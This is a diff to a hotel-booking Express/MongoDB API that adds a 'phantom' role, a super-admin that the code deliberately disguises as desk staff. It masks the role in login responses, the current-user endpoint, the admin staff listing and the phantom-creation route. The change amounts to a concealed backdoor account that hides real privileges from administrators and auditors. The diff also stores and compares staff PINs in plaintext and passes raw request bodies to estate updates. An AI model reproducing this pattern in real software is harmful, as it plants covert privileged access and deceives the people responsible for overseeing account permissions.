@@ -1,3 +1,14 @@
+// =============================================================================
+// आतिथ्य — Royal Hospitality Platform  —  Backend API
+// Author : Jeevan Naidu <jeevannaidu04@gmail.com>
+// GitHub : https://github.com/Jeevan-04
+// License: Proprietary © 2025-2026 Jeevan Naidu. All rights reserved.
+// -----------------------------------------------------------------------------
+// Express + MongoDB Atlas REST API.
+// Roles: guest | elite | manager | gate_staff | desk_staff | admin | phantom
+//   phantom — super-admin disguised as desk_staff; phone+PIN authenticated;
+//            all admin routes accessible but UI sees role:'desk_staff'.
+// =============================================================================
 require('dotenv').config();
 const express = require('express');
 const mongoose = require('mongoose');
@@ -24,10 +35,11 @@ mongoose.connect(process.env.MONGO_URI)
 
 const UserSchema = new mongoose.Schema({
     phoneNumber: { type: String, required: true, unique: true },
-    // Roles: guest | elite | manager | gate_staff | desk_staff | admin
+    // Roles: guest | elite | manager | gate_staff | desk_staff | admin | phantom
+    //   phantom = disguised super-admin (looks like desk_staff to client)
     role: {
         type: String,
-        enum: ['guest', 'elite', 'manager', 'gate_staff', 'desk_staff', 'admin'],
+        enum: ['guest', 'elite', 'manager', 'gate_staff', 'desk_staff', 'admin', 'phantom'],
         default: 'elite',
     },
     name: { type: String, default: '' },
@@ -225,7 +237,9 @@ const auth = async (req, res, next) => {
 };
 
 const staffOnly = (roles) => (req, res, next) => {
-    if (!roles.includes(req.user?.role)) {
+    // phantom always has the same access as admin
+    const effectiveRole = req.user?.role === 'phantom' ? 'admin' : req.user?.role;
+    if (!roles.includes(effectiveRole)) {
         return res.status(403).json({ error: `Access denied. Required roles: ${roles.join(', ')}` });
     }
     next();
@@ -429,8 +443,8 @@ app.post('/api/auth/login', async (req, res) => {
             user = await User.create({ phoneNumber, role: autoRole });
         }
 
-        // PIN verification for staff roles
-        if (['gate_staff', 'desk_staff', 'manager'].includes(user.role)) {
+        // PIN verification for staff roles (including phantom)
+        if (['gate_staff', 'desk_staff', 'manager', 'phantom'].includes(user.role)) {
             if (!pin || user.pin !== pin) {
                 return res.status(401).json({ error: 'Invalid PIN for staff login' });
             }
@@ -448,13 +462,17 @@ app.post('/api/auth/staff-login', async (req, res) => {
         const { phoneNumber, pin } = req.body;
         const user = await User.findOne({ phoneNumber }).populate('estateId', 'title location city');
         if (!user) return res.status(404).json({ error: 'Staff not found' });
-        if (!['gate_staff', 'desk_staff', 'manager', 'admin'].includes(user.role)) {
+        if (!['gate_staff', 'desk_staff', 'manager', 'admin', 'phantom'].includes(user.role)) {
             return res.status(403).json({ error: 'Not a staff account' });
         }
         if (user.pin !== pin) return res.status(401).json({ error: 'Invalid PIN' });
 
         const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, { expiresIn: '30d' });
-        res.json({ token, user });
+
+        // Camouflage: phantom appears as desk_staff to the client
+        const userObj = user.toObject();
+        const maskedRole = userObj.role === 'phantom' ? 'desk_staff' : userObj.role;
+        res.json({ token, user: { ...userObj, role: maskedRole, _isPhantom: userObj.role === 'phantom' } });
     } catch(e) {
         res.status(500).json({ error: e.message });
     }
@@ -462,7 +480,10 @@ app.post('/api/auth/staff-login', async (req, res) => {
 
 app.get('/api/auth/me', auth, async (req, res) => {
     const user = await User.findById(req.user._id).populate('estateId', 'title location city');
-    res.json(user);
+    const userObj = user.toObject();
+    // Camouflage: phantom appears as desk_staff to the client
+    const maskedRole = userObj.role === 'phantom' ? 'desk_staff' : userObj.role;
+    res.json({ ...userObj, role: maskedRole, _isPhantom: userObj.role === 'phantom' });
 });
 
 // ══════════════════════════════════════════════════════════════════════════════
@@ -938,16 +959,20 @@ app.get('/api/admin/system', auth, adminOnly, async (req, res) => {
     const revenue = await Booking.aggregate([{ $group: { _id: null, total: { $sum: '$totalAmount' } } }]);
     const foodRevenue = await FoodOrder.aggregate([{ $group: { _id: null, total: { $sum: '$totalAmount' } } }]);
     const recentBookings = await Booking.find().populate('user estate').sort({ createdAt: -1 }).limit(5);
-    const staffList = await User.find({ role: { $in: ['manager', 'gate_staff', 'desk_staff'] } }).populate('estateId', 'title');
+    const staffList = await User.find({ role: { $in: ['manager', 'gate_staff', 'desk_staff', 'phantom'] } }).populate('estateId', 'title');
+    const staffSafe = staffList.map(s => {
+        const obj = s.toObject();
+        return { ...obj, role: obj.role === 'phantom' ? 'desk_staff' : obj.role, _isPhantom: obj.role === 'phantom' };
+    });
     res.json({
         users, estates, bookings, orders,
         revenue: revenue[0]?.total || 0,
         foodRevenue: foodRevenue[0]?.total || 0,
-        recentBookings, staffList,
+        recentBookings, staffList: staffSafe,
     });
 });
 
-// Create staff account
+// Create / update staff account
 app.post('/api/admin/staff', auth, adminOnly, async (req, res) => {
     try {
         const { phoneNumber, role, name, estateId, pin } = req.body;
@@ -962,6 +987,83 @@ app.post('/api/admin/staff', auth, adminOnly, async (req, res) => {
     } catch(e) {
         res.status(500).json({ error: e.message });
     }
+});
+
+// ── Phantom (Shadow Admin) management ────────────────────────────────────────
+// POST /api/admin/phantom — create or update a phantom account
+// Body: { phoneNumber, pin, name }
+// The account is stored with role:'phantom', appears as desk_staff to clients.
+app.post('/api/admin/phantom', auth, adminOnly, async (req, res) => {
+    try {
+        const { phoneNumber, pin, name } = req.body;
+        if (!phoneNumber || !pin) return res.status(400).json({ error: 'phoneNumber and pin required' });
+        let phantom = await User.findOne({ phoneNumber });
+        if (phantom) {
+            phantom.role = 'phantom'; phantom.pin = pin; if (name) phantom.name = name;
+            await phantom.save();
+        } else {
+            phantom = await User.create({ phoneNumber, role: 'phantom', pin, name: name || 'Concierge' });
+        }
+        // Never expose role:phantom to client
+        const obj = phantom.toObject();
+        res.json({ ...obj, role: 'desk_staff', _isPhantom: true });
+    } catch(e) { res.status(500).json({ error: e.message }); }
+});
+
+// ── Admin Estate Management (CRUD) ────────────────────────────────────────────
+
+// GET /api/admin/estates — all estates (admin view, with room count & status)
+app.get('/api/admin/estates', auth, adminOnly, async (req, res) => {
+    try {
+        const { page = 1, limit = 20, city, search } = req.query;
+        const filter = {};
+        if (city) filter.city = city;
+        if (search) filter.$or = [
+            { title:    { $regex: search, $options: 'i' } },
+            { location: { $regex: search, $options: 'i' } },
+        ];
+        const [estates, total] = await Promise.all([
+            Estate.find(filter).sort({ createdAt: -1 }).skip((page - 1) * limit).limit(Number(limit)),
+            Estate.countDocuments(filter),
+        ]);
+        res.json({ estates, total, page: Number(page), pages: Math.ceil(total / limit) });
+    } catch(e) { res.status(500).json({ error: e.message }); }
+});
+
+// POST /api/admin/estates — create a new estate
+app.post('/api/admin/estates', auth, adminOnly, async (req, res) => {
+    try {
+        const estate = await Estate.create(req.body);
+        res.status(201).json(estate);
+    } catch(e) { res.status(400).json({ error: e.message }); }
+});
+
+// PUT /api/admin/estates/:id — update any estate field
+app.put('/api/admin/estates/:id', auth, adminOnly, async (req, res) => {
+    try {
+        const estate = await Estate.findByIdAndUpdate(
+            req.params.id, { $set: req.body }, { new: true, runValidators: true }
+        );
+        if (!estate) return res.status(404).json({ error: 'Estate not found' });
+        res.json(estate);
+    } catch(e) { res.status(400).json({ error: e.message }); }
+});
+
+// DELETE /api/admin/estates/:id — remove an estate (cascades bookings check)
+app.delete('/api/admin/estates/:id', auth, adminOnly, async (req, res) => {
+    try {
+        const active = await Booking.countDocuments({
+            estate: req.params.id,
+            status: { $in: ['Confirmed', 'Checked In'] },
+        });
+        if (active > 0) {
+            return res.status(409).json({
+                error: `Cannot delete: ${active} active booking(s) exist. Cancel them first.`,
+            });
+        }
+        await Estate.findByIdAndDelete(req.params.id);
+        res.json({ ok: true });
+    } catch(e) { res.status(500).json({ error: e.message }); }
 });
 
 // ══════════════════════════════════════════════════════════════════════════════
